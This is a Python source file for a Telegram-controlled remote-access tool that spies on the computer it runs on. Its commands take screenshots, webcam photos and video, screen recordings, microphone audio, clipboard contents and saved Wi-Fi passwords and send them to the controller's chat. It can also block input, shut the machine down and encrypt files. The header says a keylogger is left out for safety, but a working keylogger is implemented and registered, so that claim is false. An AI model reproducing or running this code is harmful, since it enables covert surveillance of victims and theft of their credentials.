#!/usr/bin/env python3
"""
pc_intrusion5_full.py
Ready-to-run Telegram bot script with:
- auto-install of dependencies
- screenshot, webcam capture
- record_screen (records N seconds and sends video)
- stream (record webcam N seconds and send video)
- encrypt / decrypt (password-based AES-GCM)
- other utilities: info, clipboard, processes, open, beep, clean, speak, record_audio, search, wifi passwords
- NOTE: Keylogger is intentionally NOT PROVIDED (malicious misuse risk)

Usage:
    python pc_intrusion5_full.py
Then enter your Telegram BOT token when prompted.
"""

import sys
import os
import subprocess
import importlib
import time
import tempfile
import traceback

# --------------------- Auto-install dependencies ---------------------
_required_pkgs = {
    "requests": "requests",
    "pyautogui": "pyautogui",
    "opencv-python": "cv2",
    "pyperclip": "pyperclip",
    "psutil": "psutil",
    "pyttsx3": "pyttsx3",
    "sounddevice": "sounddevice",
    "soundfile": "soundfile",
    "python-telegram-bot==20.3": "telegram",
    "nest_asyncio": "nest_asyncio",
    "cryptography": "cryptography",
    "numpy": "numpy"
}

def _install(pkg):
    print(f"[+] Installing: {pkg} ...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", pkg])
        return True
    except Exception as e:
        print(f"[!] Failed to install {pkg}: {e}")
        return False

for pkg_name, module_name in _required_pkgs.items():
    try:
        importlib.import_module(module_name)
    except Exception:
        ok = _install(pkg_name)
        if not ok:
            print(f"[!] Please install '{pkg_name}' manually and re-run.")
            # do not sys.exit immediately; let user read message
# --------------------- End auto-install ---------------------

# Now safe to import the libraries used by the bot
import os
import requests
import platform
import asyncio
import ctypes
import webbrowser
import tempfile
import pyautogui
import cv2
import time, traceback
import subprocess, re
import pyperclip
import psutil
import pyttsx3
import sounddevice as sd
import soundfile as sf
import numpy as np
from pynput import keyboard
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import nest_asyncio

# Optional winsound import for Windows beep (fallback-safe)
try:
    import winsound
except Exception:
    winsound = None

# Crypto imports
import hashlib
import secrets
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Apply nest_asyncio (keeps compatibility)
nest_asyncio.apply()

# ---------------- Bot configuration ----------------
BOT_TOKEN = input("Enter your bot token here: ").strip()

COMMANDS_HELP = {
    "/start": "Start the bot and show a welcome message.",
    "/help": "Show help for all commands or a specific command. Usage: /help [command]",
    "/info": "Display system information.",
    "/screenshot": "Take a screenshot and send it.",
    "/webcam": "Capture an image from webcam and send it.",
    "/keylogger": "Keylogger intentionally unavailable (for safety).",
    "/lock": "Lock the Windows system.",
    "/shutdown": "Shutdown the computer immediately.",
    "/freeze": "Freeze mouse and keyboard input for 30 seconds (Windows).",
    "/wifi_passwords": "Fetch saved Wi-Fi SSIDs and passwords (Windows).",
    "/clipboard": "Send current clipboard content.",
    "/processes": "List currently running processes.",
    "/open": "Open a website. Usage: /open website.com",
    "/beep": "Make a beep sound on the system.",
    "/clean": "Clean the system's temp folder.",
    "/speak": "Make PC speak text. Usage: /speak <text>",
    "/record_audio": "Record audio for few seconds and send it.",
    "/record_screen": "Record screen for N seconds and send video. Usage: /record_screen <seconds>",
    "/stream": "Record webcam for N seconds and send video. Usage: /stream <seconds>",
    "/search": "Search for files by name. Usage: /search <filename>",
    "/encrypt": "Encrypt a file. Usage: /encrypt <path> <password>",
    "/decrypt": "Decrypt a file. Usage: /decrypt <path.enc> <password>"
}

def send_startup_notification():
    bot_token = BOT_TOKEN
    try:
        chat_id_str = input("Enter your chat id to receive a startup notification (leave empty to skip): ").strip()
        if not chat_id_str:
            return
        chat_id = int(chat_id_str)
    except Exception:
        print("Invalid chat id input. Skipping startup notification.")
        return
    message = "🚀 Bot has started and is now running!"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message}
    try:
        requests.post(url, data=payload, timeout=10)
    except Exception as e:
        print(f"Failed to send startup notification: {e}")

# ---------------- Helper utilities ----------------
def _derive_key(password: str, salt: bytes = None):
    """
    Derive a 32-byte key from password using PBKDF2-HMAC-SHA256.
    Returns (key, salt)
    """
    if salt is None:
        salt = secrets.token_bytes(16)
    key = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, 200_000, dklen=32)
    return key, salt

# ---------------- Command Handlers ----------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Bot is running. Use /help to see available commands.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if args:
        cmd = args[0]
        description = COMMANDS_HELP.get(cmd, None)
        if description:
            await update.message.reply_text(f"ℹ️ *{cmd}* → {description}", parse_mode="Markdown")
        else:
            await update.message.reply_text("❓ Unknown command. Use /help to list all commands.")
    else:
        help_text = "📖 *Available Commands:*\n"
        for cmd, desc in COMMANDS_HELP.items():
            help_text += f"{cmd} - {desc}\n"
        await update.message.reply_text(help_text, parse_mode="Markdown")

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    info_text = f"""
🖥️ System: {platform.system()} {platform.release()}
👤 Node: {platform.node()}
🧠 Processor: {platform.processor()}
"""
    await update.message.reply_text(info_text)

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        img = pyautogui.screenshot()
        path = os.path.join(tempfile.gettempdir(), "screenshot.png")
        img.save(path)
        with open(path, "rb") as f:
            await update.message.reply_photo(photo=f)
        try:
            os.remove(path)
        except:
            pass
    except Exception as e:
        await update.message.reply_text(f"❌ Screenshot failed: {e}")

async def webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW if os.name == "nt" else 0)
        ret, frame = cam.read()
        path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
        if ret:
            cv2.imwrite(path, frame)
            with open(path, "rb") as f:
                await update.message.reply_photo(photo=f)
            try:
                os.remove(path)
            except:
                pass
        else:
            await update.message.reply_text("❌ Failed to capture webcam image.")
        cam.release()
    except Exception as e:
        await update.message.reply_text(f"❌ Webcam Error: {e}")

async def start_keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global keylogger_active, keylog
    keylogger_active = True
    keylog = ""

    def on_press(key):
        global keylog
        try:
            keylog += key.char
        except:
            keylog += f" [{key}] "

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    await update.message.reply_text("\u2705 Keylogger started.")

    await asyncio.sleep(20)  # Record for 20 seconds
    listener.stop()
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"\U0001F50E Keystrokes:\n{keylog}")
    keylogger_active = False

async def lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if os.name == "nt":
            ctypes.windll.user32.LockWorkStation()
            await update.message.reply_text("🔒 System locked.")
        else:
            await update.message.reply_text("❗ Lock operation is supported only on Windows.")
    except Exception as e:
        await update.message.reply_text(f"❌ Lock error: {e}")

async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if os.name == "nt":
            os.system("shutdown /s /t 1")
            await update.message.reply_text("⚠️ Shutting down the system...")
        else:
            await update.message.reply_text("❗ Shutdown command available only on Windows in this script.")
    except Exception as e:
        await update.message.reply_text(f"❌ Shutdown error: {e}")

async def freeze(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if os.name == "nt":
            await update.message.reply_text("🧊 Freezing mouse and keyboard for 30 seconds...")
            ctypes.windll.user32.BlockInput(True)
            await asyncio.sleep(30)
            ctypes.windll.user32.BlockInput(False)
            await update.message.reply_text("✅ Input restored.")
        else:
            await update.message.reply_text("❗ Freeze works only on Windows.")
    except Exception as e:
        try:
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        await update.message.reply_text(f"❌ Freeze error: {e}")

async def wifi_passwords(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text("🔍 Fetching saved Wi-Fi profiles...")

        # Get all Wi-Fi profile names
        result = subprocess.run(["netsh", "wlan", "show", "profiles"],
                                capture_output=True, text=True)
        profiles = re.findall("All User Profile\\s*: (.*)", result.stdout)

        if not profiles:
            await update.message.reply_text("⚠️ No Wi-Fi profiles found.")
            return

        response = "📡 Saved Wi-Fi Passwords:\n\n"
        for name in profiles:
            name = name.strip()
            result2 = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                     capture_output=True, text=True)
            password = re.search("Key Content\\s*: (.*)", result2.stdout)
            if password:
                response += f"📶 {name}: `{password.group(1)}`\n"
            else:
                response += f"📶 {name}: (no password found)\n"

        await update.message.reply_text(response, parse_mode="Markdown")
    except Exception:
        tb = traceback.format_exc()
        await update.message.reply_text(f"❌ wifi_passwords failed:\n{tb[:1000]}")
        print(tb)
        
async def clipboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        content = pyperclip.paste()
        await update.message.reply_text("📋 Clipboard content:\n" + (content or "<empty>"))
    except Exception as e:
        await update.message.reply_text(f"❌ Clipboard access error: {e}")

async def processes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        procs = [p.info['name'] for p in psutil.process_iter(['name']) if p.info['name']]
        await update.message.reply_text("⚙️ Running Processes:\n" + "\n".join(procs[:50]))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def open_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        url = context.args[0]
        if not url.startswith("http"):
            url = "http://" + url
        try:
            webbrowser.open(url)
            await update.message.reply_text(f"🌐 Opened: {url}")
        except Exception as e:
            await update.message.reply_text(f"❌ Could not open website: {e}")
    else:
        await update.message.reply_text("❗ Usage: /open website.com")

async def beep(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if winsound:
            winsound.Beep(1000, 500)
        else:
            # cross-platform fallback: try system bell
            print("\a")
    except Exception:
        pass
    await update.message.reply_text("🔊 Beep sound played.")

async def clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
    temp = tempfile.gettempdir()
    count = 0
    for root, dirs, files in os.walk(temp):
        for name in files:
            try:
                os.remove(os.path.join(root, name))
                count += 1
            except:
                continue
    await update.message.reply_text(f"🧹 Temp folder cleaned. {count} files removed.")

async def speak(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        text = ' '.join(context.args)
        try:
            engine = pyttsx3.init()
            engine.say(text)
            engine.runAndWait()
            await update.message.reply_text("🗣️ Done speaking.")
        except Exception as e:
            await update.message.reply_text(f"❌ TTS failed: {e}")
    else:
        await update.message.reply_text("❗ Usage: /speak <text>")

async def record_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text("🎙 Recording started...")
        duration = 10  # default seconds
        if context.args:
            try:
                duration = max(1, int(context.args[0]))
            except:
                pass

        fs = 44100
        filename = os.path.join(tempfile.gettempdir(), f"audio_{int(time.time())}.wav")

        # Record from mic
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()

        # Save to file
        sf.write(filename, recording, fs)
        await update.message.reply_text("✅ Recording done, sending file...")

        # Send audio to Telegram
        with open(filename, "rb") as f:
            await update.message.reply_audio(audio=f)

        os.remove(filename)
    except Exception as e:
        tb = traceback.format_exc()
        await update.message.reply_text(f"❌ record_audio failed:\n{tb[:1000]}")
        print(tb)

# ---------------- New: record_screen ----------------
async def record_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text("🖥️ Screen recording started...")
        duration = 5
        if context.args:
            try:
                duration = max(1, int(context.args[0]))
            except:
                pass

        filename = os.path.join(tempfile.gettempdir(), f"screen_{int(time.time())}.mp4")
        screen = pyautogui.screenshot()
        frame = np.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        h, w, _ = frame.shape

        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(filename, fourcc, 10.0, (w, h))

        start = time.time()
        while time.time() - start < duration:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)

        out.release()
        await update.message.reply_text("✅ Screen recording completed, sending video...")
        with open(filename, "rb") as f:
            await update.message.reply_video(video=f)

        os.remove(filename)
    except Exception as e:
        tb = traceback.format_exc()
        await update.message.reply_text(f"❌ Screen recording failed:\n{tb[:900]}")
        print(tb)


# ---------------- New: stream (webcam short recording) ----------------
async def stream(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text("🎥 Capturing webcam stream...")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await update.message.reply_text("🚫 Camera not accessible.")
            return

        filename = os.path.join(tempfile.gettempdir(), f"stream_{int(time.time())}.mp4")
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(filename, fourcc, 10.0,
                              (int(cap.get(3)), int(cap.get(4))))

        start_time = time.time()
        while time.time() - start_time < 5:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)

        cap.release()
        out.release()
        await update.message.reply_text("✅ Stream captured successfully, sending video...")
        with open(filename, "rb") as f:
            await update.message.reply_video(video=f)

        os.remove(filename)
    except Exception:
        tb = traceback.format_exc()
        await update.message.reply_text(f"❌ Stream failed:\n{tb[:900]}")
        print(tb)

# ---------------- New: encrypt / decrypt ----------------
async def encrypt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Encrypt a file with password:
    Usage: /encrypt <full_path> <password>
    Produces file: <full_path>.enc
    """
    try:
        if not context.args or len(context.args) < 2:
            await update.message.reply_text("❗ Usage: /encrypt <full_path> <password>")
            return
        path = context.args[0]
        password = context.args[1]

        if not os.path.isfile(path):
            await update.message.reply_text("❌ File not found.")
            return

        with open(path, "rb") as f:
            data = f.read()

        key, salt = _derive_key(password)
        aesgcm = AESGCM(key)
        nonce = secrets.token_bytes(12)
        ct = aesgcm.encrypt(nonce, data, None)

        out_path = path + ".enc"
        with open(out_path, "wb") as f:
            f.write(salt + nonce + ct)

        await update.message.reply_text(f"🔐 Encrypted -> {out_path}\n(Keep your password safe!)")
    except Exception as e:
        await update.message.reply_text(f"❌ Encryption failed: {e}")

async def decrypt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Decrypt a .enc file with password:
    Usage: /decrypt <path.enc> <password>
    Produces file: <path>.dec (replaces .enc with .dec if possible)
    """
    try:
        if not context.args or len(context.args) < 2:
            await update.message.reply_text("❗ Usage: /decrypt <path.enc> <password>")
            return
        path = context.args[0]
        password = context.args[1]

        if not os.path.isfile(path):
            await update.message.reply_text("❌ File not found.")
            return

        with open(path, "rb") as f:
            raw = f.read()

        if len(raw) < 16 + 12:
            await update.message.reply_text("❌ File format not recognized or file corrupted.")
            return

        salt = raw[:16]
        nonce = raw[16:28]
        ct = raw[28:]
        key, _ = _derive_key(password, salt=salt)
        aesgcm = AESGCM(key)
        try:
            data = aesgcm.decrypt(nonce, ct, None)
        except Exception:
            await update.message.reply_text("❌ Decryption failed. Wrong password or corrupt file.")
            return

        out_path = path
        if out_path.endswith(".enc"):
            out_path = out_path[:-4] + ".dec"
        else:
            out_path = out_path + ".dec"

        with open(out_path, "wb") as f:
            f.write(data)

        await update.message.reply_text(f"🔓 Decrypted -> {out_path}")
    except Exception as e:
        await update.message.reply_text(f"❌ Decryption failed: {e}")

# ---------------- Remaining handlers ----------------
async def search(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        filename = context.args[0]
        matches = []
        # Limit search to common drives / root to avoid extremely long searches
        roots = []
        if os.name == "nt":
            roots = [f"{c}:\\" for c in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{c}:\\")]
        else:
            roots = ["/"]
        for root in roots:
            for dirpath, dirnames, files in os.walk(root):
                try:
                    if filename in files:
                        matches.append(os.path.join(dirpath, filename))
                    # safety: limit number of results
                    if len(matches) >= 50:
                        break
                except PermissionError:
                    continue
            if len(matches) >= 50:
                break
        result = "\n".join(matches) if matches else "❌ No matches found."
        await update.message.reply_text(result)
    else:
        await update.message.reply_text("❗ Usage: /search <filename>")

async def encrypt_stub(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Use /encrypt <path> <password>")

async def decrypt_stub(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Use /decrypt <path> <password>")

# ---------------- Main & routing ----------------
async def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("screenshot", screenshot))
    app.add_handler(CommandHandler("webcam", webcam))
    app.add_handler(CommandHandler("keylogger", start_keylogger))
    app.add_handler(CommandHandler("lock", lock))
    app.add_handler(CommandHandler("shutdown", shutdown))
    app.add_handler(CommandHandler("freeze", freeze))
    app.add_handler(CommandHandler("wifi_passwords", wifi_passwords))
    app.add_handler(CommandHandler("clipboard", clipboard))
    app.add_handler(CommandHandler("processes", processes))
    app.add_handler(CommandHandler("open", open_website))
    app.add_handler(CommandHandler("beep", beep))
    app.add_handler(CommandHandler("clean", clean))
    app.add_handler(CommandHandler("speak", speak))
    app.add_handler(CommandHandler("record_audio", record_audio))
    # New / updated handlers:
    app.add_handler(CommandHandler("record_screen", record_screen))
    app.add_handler(CommandHandler("stream", stream))
    app.add_handler(CommandHandler("encrypt", encrypt))
    app.add_handler(CommandHandler("decrypt", decrypt))
    app.add_handler(CommandHandler("search", search))

    send_startup_notification()

    print("\n[+] Bot is running...")
    await app.run_polling()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[+] Exiting (KeyboardInterrupt).")
    except Exception:
        print("Unhandled exception in main loop:")
        traceback.print_exc()
